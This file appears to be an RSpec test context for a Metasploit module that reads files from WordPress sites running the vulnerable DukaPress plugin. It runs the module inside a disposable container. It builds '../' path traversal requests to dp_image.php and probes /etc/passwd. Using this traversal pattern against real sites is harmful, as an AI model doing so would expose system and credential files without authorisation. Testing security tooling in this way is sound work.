# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'uri'
require_relative 'profiles'

RSpec.shared_context 'native DukaPress target' do
  include_context 'module target'

  before(:all) do
    @duka_profile = DukapressProfiles.fetch
    @duka_native = { requests: [], commands: [], calls: [] }
    begin
      duka_counters('before')
      if @duka_profile.fetch('mode') == 'unrelated'
        response = duka_request('/')
        expect(response.code).to eq('200')
        expect(response.body).to include('module-target-http-marker')
      else
        @duka_baseline = duka_identity
        expect(@duka_baseline.slice('core', 'php', 'uid')).to eq(DukapressProfiles::RUNTIME)
        expect(@duka_baseline.values_at('sapi', 'prefix')).to eq(['cli', @duka_profile.fetch('prefix')])
        expect(@duka_baseline.fetch('active')).to eq(!@duka_profile.fetch('release').nil?)
        expect(@duka_baseline.fetch('plugin_version')).to eq(@duka_profile.fetch('release'))
        expect(duka_request("#{duka_prefix}/wp-login.php").body).to include('name="log"', 'name="pwd"')
        if @duka_profile.fetch('release')
          release = DukapressProfiles::RELEASES.fetch(@duka_profile.fetch('release'))
          expect(@duka_baseline.slice('archive_sha256', 'endpoint_sha256', 'resize_source_sha256')).to eq(release.slice('endpoint_sha256', 'resize_source_sha256').merge('archive_sha256' => release.fetch('sha256')))
          expect(@duka_baseline.fetch('active_plugins')).to eq(['dukapress/dukapress.php'])
          expect(duka_request("#{duka_prefix}/wp-content/plugins/dukapress/readme.txt").body).to include("Stable tag: #{@duka_profile.fetch('release')}")
          DukapressProfiles::FILES.each do |name, fixture|
            path = fixture.fetch('path')
            actual = @duka_baseline.fetch('files').fetch(path)
            expect(actual.values_at('exists', 'readable')).to eq([true, true]) unless fixture == DukapressProfiles::FILES.fetch('missing')
            response = duka_file_request(path)
            expect(response.code).to eq('200')
            expected = @duka_profile.fetch('mode') == 'affected' && actual.fetch('exists') && name != 'quoted' ? Base64.strict_decode64(actual.fetch('content_base64')) : ''.b
            expect(Digest::SHA256.hexdigest(response.body.to_s.b)).to eq(Digest::SHA256.hexdigest(expected))
          end
          quoted_path = DukapressProfiles::FILES.fetch('quoted').fetch('path')
          expected_quoted_path = quoted_path.sub("'") { "\\'" }
          expect(@duka_baseline.fetch('quoted_path_after_core_magic_quotes')).to eq(expected_quoted_path)
          expect(duka_file_request(DukapressProfiles::FILES.fetch('owned').fetch('path'), depth: 1).body.to_s).to eq('')
        else
          expect(@duka_baseline.fetch('active_plugins')).to eq([])
          expect(duka_request('/wp-content/plugins/dukapress/readme.txt').code).to eq('404')
          expect(duka_file_request('/etc/passwd').code).to eq('404')
        end
        expect(duka_identity).to eq(@duka_baseline)
      end
      provenance = console_command('irb -e \'puts "DUKAPRESS_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/scanner/http/wp_dukapress_file_read.rb").hexdigest}.to_json\'')
      values = JSON.parse(provenance.match(/^DUKAPRESS_PROVENANCE=(.+)$/)[1])
      expect(values.fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(values.fetch('owner_sha256')).to eq(Digest::SHA256.file('modules/auxiliary/scanner/http/wp_dukapress_file_read.rb').hexdigest)
      @duka_native[:provenance] = values
      @duka_native[:preflight] = 'passed'
    ensure
      duka_save
    end
  end

  after(:all) do
    expect(duka_identity).to eq(@duka_baseline) if @duka_baseline
    expect(console_command('irb -e \'puts "DUKAPRESS_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('DUKAPRESS_STATE={"sessions":[],"jobs":[]}')
  ensure
    duka_counters('after')
    duka_save
  end

  def duka_prefix
    @duka_profile.fetch('prefix')
  end

  def duka_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-dukapress.json'), JSON.pretty_generate(@duka_native)) if @duka_native
  end

  def duka_identity
    argv = target_runtime.fetch('compose') + ['exec', '-T', '--user', 'www-data', 'app', 'timeout', '20', 'php', '/opt/module-target/dukapress-inspect.php']
    output, error, status = Open3.capture3(*argv)
    @duka_native.fetch(:commands) << { argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exitstatus: status.exitstatus }
    duka_save
    raise "Native DukaPress inspection failed: #{error}" unless status.success?

    JSON.parse(output)
  end

  def duka_request(path)
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    response = http.request(Net::HTTP::Get.new(path))
    @duka_native.fetch(:requests) << { path: path, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    duka_save
    response
  end

  def duka_file_request(path, depth: @duka_profile.fetch('depth'))
    query = URI.encode_www_form('src' => ('../' * depth) + path.delete_prefix('/'))
    duka_request("#{duka_prefix}/wp-content/plugins/dukapress/lib/dp_image.php?#{query}")
  end

  def duka_loots
    Dir[File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot', '*')].select { |path| File.file?(path) }
  end

  def duka_owner(options = {}, action: 'run')
    output = run_target_module(DukapressProfiles::OWNER, 'app', {
      'SSL' => false, 'TARGETURI' => "#{duka_prefix}/", 'DEPTH' => @duka_profile.fetch('depth'), 'THREADS' => 1, 'HttpClientTimeout' => 5
    }.merge(options), action: action, allow_errors: true)
    @duka_native.fetch(:calls) << { action: action, options: options, output_base64: Base64.strict_encode64(output.b) }
    duka_save
    output
  end

  def duka_download(path, options = {})
    before = duka_loots
    output = duka_owner({ 'FILEPATH' => path }.merge(options))
    loots = duka_loots - before
    expect(loots.length).to eq(1), output.dup.force_encoding(Encoding::UTF_8).scrub
    expected = @duka_baseline.fetch('files').fetch('/' + path.delete_prefix('/'))
    expect([File.size(loots.first), Digest::SHA256.file(loots.first).hexdigest]).to eq(expected.values_at('size', 'sha256'))
    expect(output).to include('File saved in:')
    expect(output.b).to include(loots.first.b)
  end

  def duka_refuse(options = {}, action: 'run')
    before = duka_loots
    output = duka_owner(options, action: action)
    expect(duka_loots).to eq(before)
    expect(output).not_to include('File saved in:')
    expect(output).not_to include('This module does not support check.') if action == 'check'
    output
  end

  def duka_counters(phase)
    roles = @duka_profile.fetch('mode') == 'unrelated' ? ['app'] : %w[app db]
    values = roles.to_h do |role|
      counters = %w[memory.events pids.events].to_h do |name|
        numbers = target_exec(role, 'cat', "/sys/fs/cgroup/#{name}").lines.to_h do |line|
          key, value = line.split
          [key, Integer(value, 10)]
        end
        [name, numbers]
      end
      [role, counters]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), "dukapress-resources-#{phase}.json"), JSON.pretty_generate(values))
    values.each_value do |counters|
      expect(counters.fetch('memory.events').values_at('oom', 'oom_kill')).to eq([0, 0])
      expect(counters.fetch('pids.events').fetch('max')).to eq(0)
    end
  end
end
